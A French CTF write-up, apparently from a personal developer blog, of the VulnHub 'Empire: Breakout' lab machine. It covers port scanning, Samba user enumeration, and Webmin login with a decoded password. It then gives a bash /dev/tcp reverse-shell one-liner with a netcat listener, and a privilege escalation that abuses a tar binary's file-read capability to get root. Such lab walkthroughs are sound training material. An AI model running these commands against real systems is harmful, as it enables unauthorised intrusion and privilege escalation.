<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Empire: Breakout - https://etienner.github.io</title><meta name="gridsome:hash" content="b89929ffb278454bd1f8bb0277abaa50df9b43f7"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Empire: Breakout"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-empire-breakout/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Empire: Breakout"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.50d8a5ce.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.56e5bc07.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.027f19cb.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.aae09759.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Empire: Breakout</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>20 novembre 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 3 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/empire-breakout,751" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.3</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.21</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir EmpireBreakout &amp;&amp; cd EmpireBreakout</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT      STATE SERVICE     VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http        Apache httpd <span class="token number">2.4</span>.51 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">4.6</span>.2
<span class="token number">445</span>/tcp   <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">4.6</span>.2
<span class="token number">10000</span>/tcp <span class="token function">open</span>  http        MiniServ <span class="token number">1.981</span> <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span>
<span class="token number">20000</span>/tcp <span class="token function">open</span>  http        MiniServ <span class="token number">1.830</span> <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un serveur <strong>Apache</strong> 2.4.51 sur le port <strong>80</strong>, un serveur <strong>Samba</strong> 4.6.2 sur les port <strong>139</strong> et <strong>445</strong> et 2 deux serveurs <strong>Webmin</strong> (de 2 versions diff√©rentes) sur les ports <strong>10000</strong> et <strong>20000</strong>.</p>
<p>Sur la page d'accueil du serveur <strong>Apache</strong>, on a indice en bas du code source de la page HTML.</p>
<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">&lt;!--
don&#39;t worry no one will get here, it&#39;s safe to share with you my access. Its encrypted :)

++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.

--&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>C'est le fameux langage <strong>brainfuck</strong> qui retourne une sorte de mot de passe ".2uqPEfj3D&#x3C;P'a-3".</p>
<p>Ensuite, on √©num√®re le serveur <strong>Samba</strong> √† la recherche d'un utilisateur avec l'outil <strong>enum4linux</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">enum4linux -a <span class="token variable">$IP</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating <span class="token function">users</span> using SID S-1-22-1 and logon username <span class="token string">''</span>, password <span class="token string">''</span>
S-1-22-1-1000 Unix User<span class="token punctuation">\</span>cyber <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un utilisateur potentiel, "cyber".</p>
<p>Puis, on poursuit avec les 2 serveurs <strong>Webmin</strong> qui nous indiquent le host √† utiliser.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
<span class="token number">192.168</span>.1.21    breakout.home</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>La connexion avec <code class="language-text">cyber:.2uqPEfj3D&lt;P&#39;a-3</code> ne fonctionne pas sur le premier serveur avec le port <strong>10000</strong> mais sur le second avec le <strong>20000</strong>.</p>
<h2>P√©n√©tration</h2>
<p>Dans le menu de gauche, il y a une petite icone qui symbolise une commande shell. On va ouvrir un reverse shell pour √™tre plus √† l'aise. Dans un nouvel onglet de votre terminal, instanciez le serveur <strong>Netcat</strong> <code class="language-text">nc -lanp 1234</code>. Puis dans le shell de Webmin, <code class="language-text">bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.33/1234 0&gt;&amp;1&#39;</code></p>
<p>On trouve le premier flag dans le r√©pertoire de l'utilisateur "cyber".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> user.txt
3mp<span class="token operator">!</span>r3<span class="token punctuation">{</span>You_Manage_To_Break_To_My_Secure_Access<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>Dans le m√™me r√©pertoire, il y a un ex√©cutable "tar", plus pr√©cis√©ment un ELF (Executable and Linkable Format).</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ls</span> -la
-rwxr-xr-x  <span class="token number">1</span> root  root  <span class="token number">531928</span> Oct <span class="token number">19</span> <span class="token number">15</span>:40 <span class="token function">tar</span>
$ <span class="token function">file</span> <span class="token function">tar</span>
tar: ELF <span class="token number">64</span>-bit LSB pie executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>727740cc46ed2e44f47dfff7bad5dc3fdb1249cb, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, stripped</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On affiche les <em>capabilities</em> (capacit√©s) de cet ex√©cutable avec la commande <strong>getcap</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ getcap <span class="token function">tar</span>
<span class="token function">tar</span> <span class="token assign-left variable">cap_dac_read_search</span><span class="token operator">=</span>ep</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Cette <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-with-binary-3" target="_blank" rel="nofollow noopener noreferrer">option</a> signifie que le binaire sera capable de lire n'importe quel fichier. Cela tombe √† pic car dans le dossier "/var/backups", on a un fichier que l'on voudrait pouvoir lire ".old_pass.bak" car on n'a pas les droits de lecture.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ ./tar -cf back.tar /var/backups/.old_pass.bak
$ <span class="token function">tar</span> -xf back.tar
$ <span class="token function">ls</span>
back.tar  <span class="token function">tar</span>  user.txt  var</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Le dossier "var" a √©t√© cr√©√© et on peut lire son contenu.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> var/backups/.old_pass.bak
Ts<span class="token operator">&amp;</span><span class="token number">4</span><span class="token operator">&amp;</span>YurgtRX<span class="token punctuation">(</span><span class="token operator">=</span>~h</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Comme convenu, il contient un mot de passe, ce qui nous permet de nous connecter en tant qu'utilisateur "root".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">su</span> root
Password: Ts<span class="token operator">&amp;</span><span class="token number">4</span><span class="token operator">&amp;</span>YurgtRX<span class="token punctuation">(</span><span class="token operator">=</span>~h
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Et on trouve rapidement le second et dernier flag.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> ~
$ <span class="token function">cat</span> rOOt.txt
3mp<span class="token operator">!</span>r3<span class="token punctuation">{</span>You_Manage_To_BreakOut_From_My_System_Congratulation<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Empire: Breakout","date":"20 November 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.3\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.21\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir EmpireBreakout &amp;&amp; cd EmpireBreakout\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT      STATE SERVICE     VERSION\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp    \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http        Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.51 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EDebian\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E139\u003C\u002Fspan\u003E\u002Ftcp   \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  netbios-ssn Samba smbd \u003Cspan class=\"token number\"\u003E4.6\u003C\u002Fspan\u003E.2\n\u003Cspan class=\"token number\"\u003E445\u003C\u002Fspan\u003E\u002Ftcp   \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  netbios-ssn Samba smbd \u003Cspan class=\"token number\"\u003E4.6\u003C\u002Fspan\u003E.2\n\u003Cspan class=\"token number\"\u003E10000\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http        MiniServ \u003Cspan class=\"token number\"\u003E1.981\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EWebmin httpd\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E20000\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http        MiniServ \u003Cspan class=\"token number\"\u003E1.830\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EWebmin httpd\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E 2.4.51 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E, un serveur \u003Cstrong\u003ESamba\u003C\u002Fstrong\u003E 4.6.2 sur les port \u003Cstrong\u003E139\u003C\u002Fstrong\u003E et \u003Cstrong\u003E445\u003C\u002Fstrong\u003E et 2 deux serveurs \u003Cstrong\u003EWebmin\u003C\u002Fstrong\u003E (de 2 versions diff√©rentes) sur les ports \u003Cstrong\u003E10000\u003C\u002Fstrong\u003E et \u003Cstrong\u003E20000\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003ESur la page d'accueil du serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E, on a indice en bas du code source de la page HTML.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"txt\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"\u003E\u003Ccode class=\"language-txt\"\u003E&lt;!--\ndon&#39;t worry no one will get here, it&#39;s safe to share with you my access. Its encrypted :)\n\n++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.\n\n--&gt;\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EC'est le fameux langage \u003Cstrong\u003Ebrainfuck\u003C\u002Fstrong\u003E qui retourne une sorte de mot de passe \".2uqPEfj3D&#x3C;P'a-3\".\u003C\u002Fp\u003E\n\u003Cp\u003EEnsuite, on √©num√®re le serveur \u003Cstrong\u003ESamba\u003C\u002Fstrong\u003E √† la recherche d'un utilisateur avec l'outil \u003Cstrong\u003Eenum4linux\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Eenum4linux -a \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\n\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E+\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Enumerating \u003Cspan class=\"token function\"\u003Eusers\u003C\u002Fspan\u003E using SID S-1-22-1 and logon username \u003Cspan class=\"token string\"\u003E''\u003C\u002Fspan\u003E, password \u003Cspan class=\"token string\"\u003E''\u003C\u002Fspan\u003E\nS-1-22-1-1000 Unix User\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003Ecyber \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ELocal User\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un utilisateur potentiel, \"cyber\".\u003C\u002Fp\u003E\n\u003Cp\u003EPuis, on poursuit avec les 2 serveurs \u003Cstrong\u003EWebmin\u003C\u002Fstrong\u003E qui nous indiquent le host √† utiliser.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Evim\u003C\u002Fspan\u003E \u002Fetc\u002Fhosts\n\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.21    breakout.home\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELa connexion avec \u003Ccode class=\"language-text\"\u003Ecyber:.2uqPEfj3D&lt;P&#39;a-3\u003C\u002Fcode\u003E ne fonctionne pas sur le premier serveur avec le port \u003Cstrong\u003E10000\u003C\u002Fstrong\u003E mais sur le second avec le \u003Cstrong\u003E20000\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EDans le menu de gauche, il y a une petite icone qui symbolise une commande shell. On va ouvrir un reverse shell pour √™tre plus √† l'aise. Dans un nouvel onglet de votre terminal, instanciez le serveur \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Enc -lanp 1234\u003C\u002Fcode\u003E. Puis dans le shell de Webmin, \u003Ccode class=\"language-text\"\u003Ebash -c &#39;bash -i &gt;&amp; \u002Fdev\u002Ftcp\u002F192.168.1.33\u002F1234 0&gt;&amp;1&#39;\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EOn trouve le premier flag dans le r√©pertoire de l'utilisateur \"cyber\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E user.txt\n3mp\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003Er3\u003Cspan class=\"token punctuation\"\u003E{\u003C\u002Fspan\u003EYou_Manage_To_Break_To_My_Secure_Access\u003Cspan class=\"token punctuation\"\u003E}\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EDans le m√™me r√©pertoire, il y a un ex√©cutable \"tar\", plus pr√©cis√©ment un ELF (Executable and Linkable Format).\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Els\u003C\u002Fspan\u003E -la\n-rwxr-xr-x  \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E root  root  \u003Cspan class=\"token number\"\u003E531928\u003C\u002Fspan\u003E Oct \u003Cspan class=\"token number\"\u003E19\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E15\u003C\u002Fspan\u003E:40 \u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E\ntar: ELF \u003Cspan class=\"token number\"\u003E64\u003C\u002Fspan\u003E-bit LSB pie executable, x86-64, version \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ESYSV\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E, dynamically linked, interpreter \u002Flib64\u002Fld-linux-x86-64.so.2, BuildID\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003Esha1\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E727740cc46ed2e44f47dfff7bad5dc3fdb1249cb, \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E GNU\u002FLinux \u003Cspan class=\"token number\"\u003E3.2\u003C\u002Fspan\u003E.0, stripped\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn affiche les \u003Cem\u003Ecapabilities\u003C\u002Fem\u003E (capacit√©s) de cet ex√©cutable avec la commande \u003Cstrong\u003Egetcap\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ getcap \u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E\n\u003Cspan class=\"token function\"\u003Etar\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Ecap_dac_read_search\u003C\u002Fspan\u003E\u003Cspan 